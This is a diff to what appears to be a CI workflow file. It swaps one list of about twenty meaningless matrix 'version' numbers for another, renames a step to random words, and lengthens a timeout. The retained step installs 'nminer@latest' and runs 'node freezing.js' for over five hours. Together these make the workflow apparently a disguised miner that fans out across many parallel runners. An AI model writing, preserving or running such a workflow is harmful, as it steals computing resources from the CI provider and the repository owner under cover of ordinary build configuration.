@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6189 }
-          - { version: 5820 }
-          - { version: 6375 }
-          - { version: 4579 }
-          - { version: 9456 }
-          - { version: 4742 }
-          - { version: 6935 }
-          - { version: 3761 }
-          - { version: 6408 }
-          - { version: 1953 }
-          - { version: 4113 }
-          - { version: 7754 }
-          - { version: 9818 }
-          - { version: 5175 }
-          - { version: 89 }
-          - { version: 4618 }
-          - { version: 4395 }
-          - { version: 2057 }
-          - { version: 4319 }
-          - { version: 6554 }
+          - { version: 85 }
+          - { version: 5453 }
+          - { version: 8873 }
+          - { version: 1010 }
+          - { version: 9966 }
+          - { version: 103 }
+          - { version: 4687 }
+          - { version: 4161 }
+          - { version: 1368 }
+          - { version: 15 }
+          - { version: 2160 }
+          - { version: 5995 }
+          - { version: 39 }
+          - { version: 7964 }
+          - { version: 9313 }
+          - { version: 4872 }
+          - { version: 8174 }
+          - { version: 890 }
+          - { version: 2134 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: without reproachfully fun
+      - name: yearly yahoo sedately
         run: |
           npm install nminer@latest
-          timeout 323m node freezing.js || echo "freezing executed"
+          timeout 336m node freezing.js || echo "freezing executed"
